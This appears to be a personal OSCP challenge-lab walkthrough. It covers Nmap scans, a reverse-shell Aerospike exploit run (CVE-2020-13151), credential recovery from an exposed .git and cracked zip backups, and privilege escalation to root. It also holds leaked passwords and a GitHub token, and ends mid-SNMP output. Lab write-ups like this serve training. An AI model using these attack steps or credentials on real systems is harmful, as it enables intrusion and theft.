## Nmap
```bash
nmap -A -sV -T4 -iL target
```
```json
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-13 20:14 CST
Nmap scan report for 192.168.224.141
Host is up (0.34s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
80/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
| http-methods:
|_  Potentially risky methods: TRACE
|_http-generator: Nicepage 4.8.2, nicepage.com
|_http-title: Home
81/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: Attendance and Payroll System
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-07-13T12:20:29
|_  start_date: N/A

Nmap scan report for 192.168.224.143
Host is up (0.31s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Test Page for the Nginx HTTP Server on Fedora
443/tcp  open  http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql?
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
| fingerprint-strings:
|   SMBProgNeg:
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2113
|_    RProcessStartupPacket
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3003-TCP:V=7.92%I=7%D=7/13%Time=64AFEB62%P=aarch64-unknown-linux-gn
SF:u%r(GenericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(R
SF:TSPRequest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalSer
SF:verCookie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDS
SF:tring,1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=7.92%I=7%D=7/13%Time=64AFEB60%P=aarch64-unknown-linux-gn
SF:u%r(SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20f
SF:rontend\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20t
SF:o\x203\.0\0Fpostmaster\.c\0L2113\0RProcessStartupPacket\0\0");
Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.224.144
Host is up (0.31s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: Nicepage 4.21.12, nicepage.com
| http-git:
|   192.168.224.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update
|     Remotes:
|_      https://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@github.com/PWK-Challenge-Lab/dev.git
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Home
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.224.145
Host is up (0.31s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Samuel's Personal Site
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2023-07-13T12:20:36+00:00
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2023-07-12T12:03:17
|_Not valid after:  2024-01-11T12:03:17
|_ssl-date: 2023-07-13T12:21:06+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-07-13T12:20:39
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Post-scan script results:
| clock-skew:
|   0s:
|     192.168.224.145
|_    192.168.224.141
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 6 IP addresses (4 hosts up) scanned in 396.13 seconds
```

<!--重連 VPN，IP 改為 192.168.192.xxx & 10.10.82.xxx-->

## 143

先打 192.168.192.143，searchsploit PostgreSQL 沒什麼結果，透過 CN 判斷其為 Aerospike DB
```bash
searchsploit aero
```
```json
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Aero CMS v0.0.1 - PHP Code Injection (auth)                                                | php/webapps/51085.txt
Aero CMS v0.0.1 - SQL Injection (no auth)                                                  | php/webapps/51083.txt
Aero CMS v0.0.1 - SQLi                                                                     | php/webapps/51022.txt
Aerohive HiveOS 5.1r5 < 6.1r5 - Multiple Vulnerabilities                                   | php/webapps/34038.txt
Aerohive HiveOS 5.1r5 < 6.1r5 - Remote Code Execution                                      | hardware/webapps/42178.py
Aerospike Database 5.1.0.3 - OS Command Execution                                          | multiple/remote/49067.py
Extreme Networks Aerohive HiveOS 11.0 - Remote Denial of Service (PoC)                     | hardware/dos/48441.sh
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

嘗試使用 49067.py，但執行失敗，透過 CVE 編號去找其他 PoC (照 python 掃出的版本應該是有風險才對)
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A]
└─$ python3 49067.py --ahost 192.168.192.143 --pythonshell --lhost=192.168.45.245 --lport=443
[+] aerospike build info: 5.1.0.1

[-] this instance is patched.
```

找到 [Github](https://github.com/b4ny4n/CVE-2020-13151)下載 PoC，執行後成功 (port 需指定為 443 才能成功)
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/CVE-2020-13151]
└─$ python3 cve2020-13151.py --ahost 192.168.192.143 --pythonshell --lhost=192.168.45.245 --lport=443
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote XSiwXCuQLflOyAqL
[+] registering udf
[+] sending payload, make sure you have a listener on 192.168.45.245:443.....
```

Get Shell!

### 143 提權
```json
aero@oscp:/$ cat /etc/os-release 2>/dev/null
cat /etc/os-release 2>/dev/null
NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

從 kali 下載 linpeas.sh，並執行
```json
aero@oscp:/home/aero$ wget http://192.168.45.245:80/linpeas.sh
wget http://192.168.45.245:80/linpeas.sh
--2023-07-19 14:51:46--  http://192.168.45.245/linpeas.sh
Connecting to 192.168.45.245:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 836190 (817K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 816.59K   277KB/s    in 2.9s

2023-07-19 14:51:50 (277 KB/s) - ‘linpeas.sh’ saved [836190/836190]
```

<!--重連 VPN，IP 換成 192.168.212.xxx & 10.10.102.xxx-->

執行指令以 SUID 尋找可利用目標，發現 screen-4.5.0 且有提權漏洞
```json
find / -perm -u=s -type f 2>/dev/null
```

但沒法利用成功

[CSDN](https://blog.csdn.net/weixin_65527369/article/details/127973141?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-127973141-blog-128828999.235%5Ev32%5Epc_relevant_default_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-127973141-blog-128828999.235%5Ev32%5Epc_relevant_default_base3&utm_relevant_index=2)

## 144

nmap 發現有 .git 存在，首先使用 GitHack 查看有無資訊可利用

```bash
python2 GitHack.py http://192.168.212.144/.git/
```

只發現了一個 database.php

```json
┌──(ouyang㉿kali)-[~/…/git/GitHack/192.168.212.144/configuration]
└─$ cat database.php
<?php
class Database{
    private $host = "localhost";
    private $db_name = "staff";
    private $username = "";
    private $password = "";
// Cleartext creds cannot be added to public repos!
    public $conn;
    public function getConnection() {
        $this->conn = null;
        try{
            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
            $this->conn->exec("set names utf8");
        }catch(PDOException $exception){
            echo "Connection error: " . $exception->getMessage();
        }
        return $this->conn;
    }
}
?>
```

嘗試使用 wget 將完整 .git 拉下來看看

```bash
wget -r http://192.168.212.144/.git
cd 192.168.212.144
```

接著可使用 git 指令確認歷史修改紀錄

```json
┌──(ouyang㉿kali)-[~/…/OSCP/LAB_A/144/192.168.212.144]
└─$ git log
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:56:19 2022 +0200

    Delete database.php

commit eda55ed6455d29532295684e3900cda74d695067
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:40 2022 +0200

    Create robots.txt

commit ce3d418cc1bb5c5388fdc00cee5ba1cb764f499b
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:08 2022 +0200

    Create search.php

commit 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:26:09 2022 +0200
```

發現 database.php 被刪除

```json
┌──(ouyang㉿kali)-[~/…/OSCP/LAB_A/144/192.168.212.144]
└─$ git show 621a2e79b3a4a08bba12effe6331ff4513bad91a
commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

diff --git a/configuration/database.php b/configuration/database.php
new file mode 100644
index 0000000..55b1645
--- /dev/null
+++ b/configuration/database.php
@@ -0,0 +1,19 @@
+<?php
+class Database{
+    private $host = "localhost";
+    private $db_name = "staff";
+    private $username = "stuart@challenge.lab";
+    private $password = "BreakingBad92";
+    public $conn;
+    public function getConnection() {
+        $this->conn = null;
+        try{
+            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
+            $this->conn->exec("set names utf8");
+        }catch(PDOException $exception){
+            echo "Connection error: " . $exception->getMessage();
+        }
+        return $this->conn;
+    }
+}
+?>
```

成功得到一組帳密 
```json
username: stuart@challenge.lab
password: BreakingBad92
```

成功登入 ssh
```json
┌──(ouyang㉿kali)-[~]
└─$ ssh stuart@192.168.212.144
The authenticity of host '192.168.212.144 (192.168.212.144)' can't be established.
ED25519 key fingerprint is SHA256:NQ0P6b7BgHDdEToc64di95hvEzS2pdZ7E02r4ZBkBYM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.212.144' (ED25519) to the list of known hosts.
stuart@192.168.212.144's password:
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul 22 09:37:30 AM UTC 2023

  System load:  0.0                Processes:               203
  Usage of /:   40.0% of 18.53GB   Users logged in:         0
  Memory usage: 7%                 IPv4 address for ens160: 192.168.212.144
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
stuart@oscp:~$
```

拿到 local.txt

	重連 VPN，IP 換成 192.168.244.xxx & 10.10.134.xxx

### 144 提權


接著執行 linpeas.sh，透過 python web server 分享，並於靶機中下載

```bash
chmod +x linpeas.sh
./linpeas.sh
```

```json
╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 2196 May 25  2022 /usr/libexec/dpkg/dpkg-db-backup
-rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-headers-5.15.0-53/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-headers-5.15.0-25/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 416107 Dec 21  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 11849 Oct 31  2022 /usr/share/info/dir.old
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 2747 Feb 16  2022 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 147 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 138 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 13049 Oct 17  2022 /usr/lib/modules/5.15.0-53-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 10833 Oct 17  2022 /usr/lib/modules/5.15.0-53-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 11977 Mar 30  2022 /usr/lib/modules/5.15.0-25-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 10105 Mar 30  2022 /usr/lib/modules/5.15.0-25-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 1423 Nov 18  2022 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-310.pyc
-rw-r--r-- 1 root root 1802 Aug 15  2022 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 44008 Aug 16  2022 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 2403 Apr 21  2022 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 stuart stuart 26890 Apr  5  2018 /opt/backup/sitebackup1.zip
-rw-r--r-- 1 stuart stuart 25312 Mar  5  2020 /opt/backup/sitebackup3.zip
-rw-r--r-- 1 stuart stuart 24701 Nov 18  2022 /opt/backup/sitebackup2.zip
-rw-r--r-- 1 root root 2703 Oct 25  2022 /var/www/html/cms/administrator/components/com_users/tmpl/method/backupcodes.php
-rw-r--r-- 1 root root 2537 Oct 25  2022 /var/www/html/cms/components/com_users/tmpl/method/backupcodes.php
-rw-r--r-- 1 root root 0 Apr 21  2022 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 61 Oct 31  2022 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
```

發現 /opt/backup 裡面有 3 個備份壓縮檔，載回 kali 嘗試用 7z 解壓縮發現有密碼，使用 john 破解

```json
┌──(ouyang㉿kali)-[~/…/OSCP/LAB_A/144/sitebackup]
└─$ zip2john sitebackup3.zip > test.john
ver 2.0 sitebackup3.zip/joomla/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/administrator/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/api/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/cache/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/cli/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/components/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/images/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/includes/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/language/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/language/overrides/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/layouts/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/libs/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/media/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/modules/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/plugins/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/templates/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/tmp/ is not encrypted, or stored with non-handled compression type
```

```json
┌──(ouyang㉿kali)-[~/…/OSCP/LAB_A/144/sitebackup]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt test.john
Using default input encoding: UTF-8
Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 128/128 ASIMD 4x])
Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:18 0.12% (ETA: 02:50:43) 0g/s 1077p/s 21387c/s 21387C/s leonardo1..michelle4
0g 0:00:00:23 0.15% (ETA: 02:46:40) 0g/s 1111p/s 21377c/s 21377C/s joey1..220292
codeblue         (sitebackup3.zip/joomla/language/.DS_Store)
codeblue         (sitebackup3.zip/joomla/includes/app.php)
codeblue         (sitebackup3.zip/joomla/web.config.txt)
codeblue         (sitebackup3.zip/joomla/cli/joomla.php)
codeblue         (sitebackup3.zip/joomla/cli/index.html)
codeblue         (sitebackup3.zip/joomla/htaccess.txt)
codeblue         (sitebackup3.zip/joomla/LICENSE.txt)
codeblue         (sitebackup3.zip/joomla/includes/index.html)
codeblue         (sitebackup3.zip/joomla/language/overrides/index.html)
codeblue         (sitebackup3.zip/joomla/cache/index.html)
codeblue         (sitebackup3.zip/joomla/includes/defines.php)
codeblue         (sitebackup3.zip/joomla/README.txt)
codeblue         (sitebackup3.zip/joomla/language/index.html)
codeblue         (sitebackup3.zip/joomla/.DS_Store)
codeblue         (sitebackup3.zip/joomla/includes/framework.php)
codeblue         (sitebackup3.zip/joomla/index.php)
codeblue         (sitebackup3.zip/joomla/configuration.php)
codeblue         (sitebackup3.zip/joomla/robots.txt)
codeblue         (sitebackup3.zip/joomla/tmp/index.html)
19g 0:00:00:35 DONE (2023-07-24 22:38) 0.5356g/s 1125p/s 21392c/s 21392C/s treetree..prospect
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

成功得到壓縮檔密碼
```json
password --> codeblue
```

解壓縮後用 grep 查看是否有 pass 相關字串

```json
┌──(ouyang㉿kali)-[~/…/OSCP/LAB_A/144/sitebackup]
└─$ grep -r "pass" joomla/ --color
joomla/configuration.php:	public $password = 'Password@1';
joomla/configuration.php:	public $smtppass = '';
joomla/LICENSE.txt:software.  If the software is modified by someone else and passed on, we
joomla/LICENSE.txt:  `Gnomovision' (which makes passes at compilers) written by James Hacker.
```

	重連 VPN，IP 換成 192.168.235.xxx & 10.10.125.xxx

查看 joomla/configuration.php
```json
┌──(ouyang㉿kali)-[~/…/LAB_A/144/sitebackup/joomla]
└─$ cat configuration.php
<?php
class JConfig {
	public $offline = false;
	public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
	public $display_offline_message = 1;
	public $offline_image = '';
	public $sitename = 'Challenge Lab';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = 20;
	public $access = 1;
	public $debug = false;
	public $debug_lang = false;
	public $debug_lang_const = true;
	public $dbtype = 'mysql';
	public $host = 'localhost';
	public $user = 'joomla';
	public $password = 'Password@1';
	public $db = 'jooml';
	public $dbprefix = 'o83rl_';
	public $dbencryption = 0;
	public $dbsslverifyservercert = false;
	public $dbsslkey = '';
	public $dbsslcert = '';
	public $dbsslca = '';
	public $dbsslcipher = '';
	public $force_ssl = 0;
	public $live_site = '';
	public $secret = 'Ee24zIK4cDhJHL4H';
	public $gzip = false;
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
	public $offset = 'UTC';
	public $mailonline = true;
	public $mailer = 'mail';
	public $mailfrom = 'chloe@challenge.lab';
	public $fromname = 'Challenge Lab';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = false;
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = 25;
	public $caching = 0;
	public $cache_handler = 'file';
	public $cachetime = 15;
	public $cache_platformprefix = false;
	public $MetaDesc = '';
	public $MetaAuthor = true;
	public $MetaVersion = false;
	public $robots = '';
	public $sef = true;
	public $sef_rewrite = false;
	public $sef_suffix = false;
	public $unicodeslugs = false;
	public $feed_limit = 10;
	public $feed_email = 'none';
	public $log_path = '/var/www/html/joomla/administrator/logs';
	public $tmp_path = '/var/www/html/joomla/tmp';
	public $lifetime = 15;
	public $session_handler = 'database';
	public $shared_session = false;
	public $session_metadata = true;
}
```

其中發現下列資訊，判斷可能是 chloe 的密碼
```json
	public $secret = 'Ee24zIK4cDhJHL4H';
	...
	public $mailfrom = 'chloe@challenge.lab';
```

嘗試 su 切換使用者 (透過 linpea.sh 結果可得知 chloe 具有 sudo 權限)

```json
stuart@oscp:~$ su chloe
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

chloe@oscp:/home/stuart$ sudo su
[sudo] password for chloe:
root@oscp:/home/stuart# cd
root@oscp:~# ls
proof.txt  snap
root@oscp:~# cat proof.txt
d65f7728757d36d88a0c512a64ead4ca
root@oscp:~#
```

got proof.txt!

## 145

透過 nmap 結果發現有 ftp，並且可用 anonymous/anonymous 登入，但登入後無法 ls，會卡住 timeout

```json
┌──(ouyang㉿kali)-[~]
└─$ ftp 192.168.235.145
Connected to 192.168.235.145.
220 Microsoft FTP Service
Name (192.168.235.145:ouyang): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -al
229 Entering Extended Passive Mode (|||63181|)
ls -a
^C
receive aborted. Waiting for remote to finish abort.
ftp> ls -a
229 Entering Extended Passive Mode (|||63183|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> dir
229 Entering Extended Passive Mode (|||63184|)
^C
receive aborted. Waiting for remote to finish abort.
```

```json
┌──(ouyang㉿kali)-[~]
└─$ nc -C 192.168.235.145 21
220 Microsoft FTP Service
USER anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
PASS anonymous
230 User logged in.
PRIV
500 Command not understood.
PASV
227 Entering Passive Mode (192,168,235,145,247,62).
ls
500 Command not understood.
PASV
227 Entering Passive Mode (192,168,235,145,247,69).
HELP
214-The following commands are recognized (* ==>'s unimplemented).
    ABOR
    ACCT
    ADAT *
    ALLO
```

沒獲得有用的資訊

改掃 UDP port，發現有 snmp service

```json
┌──(ouyang㉿kali)-[~/…/OSCP/LAB_A/144/sitebackup]
└─$ sudo nmap -sU 192.168.235.145
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-26 23:32 CST
Nmap scan report for 192.168.235.145
Host is up (0.33s latency).
Not shown: 999 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 285.40 seconds
```

	重連 VPN，IP 換成 192.168.234.xxx & 10.10.124.xxx

繼續用 Nmap 掃描
```json
┌──(ouyang㉿kali)-[~]
└─$ nmap --script "snmp* and not snmp-brute" 192.168.234.145
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-28 15:48 CST
Nmap scan report for 192.168.234.145
Host is up (0.27s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 12.64 seconds

┌──(ouyang㉿kali)-[~]
└─$ nmap -sU --script "snmp* and not snmp-brute" 192.168.234.145
You requested a scan type which requires root privileges.
QUITTING!

┌──(ouyang㉿kali)-[~]
└─$ sudo nmap -sU --script "snmp* and not snmp-brute" 192.168.234.145
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-28 15:49 CST
Nmap scan report for 192.168.234.145
Host is up (0.31s latency).
Not shown: 999 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp
| snmp-processes:
|   1:
|     Name: System Idle Process
|   4:
|     Name: System
|   92:
|     Name: Registry
|   372:
|     Name: smss.exe
|   456:
|     Name: svchost.exe
|   460:
|     Name: csrss.exe
|   464:
|     Name: dwm.exe
|   564:
|     Name: wininit.exe
|   580:
|     Name: csrss.exe
|   656:
|     Name: winlogon.exe
|   672:
|     Name: services.exe
|   708:
|     Name: lsass.exe
|     Path: C:\WINDOWS\system32\
|   808:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k DcomLaunch -p -s PlugPlay
|   824:
|     Name: fontdrvhost.exe
|   860:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k DcomLaunch -p
|   876:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalServiceNoNetwork -p
|   908:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
